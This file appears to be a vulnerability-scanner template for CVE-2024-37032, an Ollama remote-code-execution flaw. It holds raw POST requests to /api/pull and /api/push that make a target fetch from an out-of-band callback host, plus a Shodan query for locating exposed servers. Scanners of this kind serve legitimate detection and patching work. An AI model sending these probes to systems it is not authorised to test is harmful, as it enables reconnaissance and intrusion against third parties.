http:
- matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, 'http')
    - contains_all(header, 'application/x-ndjson') && contains(body_2, 'retrieving
      manifest')
    type: dsl
  raw:
  - 'POST /api/pull HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"name": "http://{{interactsh-url}}/rogue/{{randstr}}", "insecure": true}

    '
  - 'POST /api/push HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"name": "http://{{interactsh-url}}/rogue/{{randstr}}", "insecure": true}

    '
id: CVE-2024-37032
info:
  author: kaks3c
  classification:
    cpe: cpe:2.3:a:ollama:ollama:*:*:*:*:*:*:*:*
    epss-percentile: 0.99841
    epss-score: 0.93769
  description: 'Ollama before 0.1.34 does not validate the format of the digest (sha256
    with 64 hex digits) when getting the model path, and thus mishandles the TestGetBlobsPath
    test cases such as fewer than 64 hex digits, more than 64 hex digits, or an initial
    ../ substring.

    '
  impact: 'Attackers can exploit improper digest validation to achieve remote code
    execution on Ollama servers.

    '
  metadata:
    max-request: 1
    product: ollama
    shodan-query: ollama
    vendor: ollama
    verified: true
  name: Ollama - Remote Code Execution
  reference:
  - https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032
  - https://nvd.nist.gov/vuln/detail/CVE-2024-37032
  - https://github.com/Bi0x/CVE-2024-37032
  remediation: 'Update Ollama to version 0.1.34 or later.

    '
  severity: critical
  tags: cve,cve2024,ollama,rce,vkev,vuln
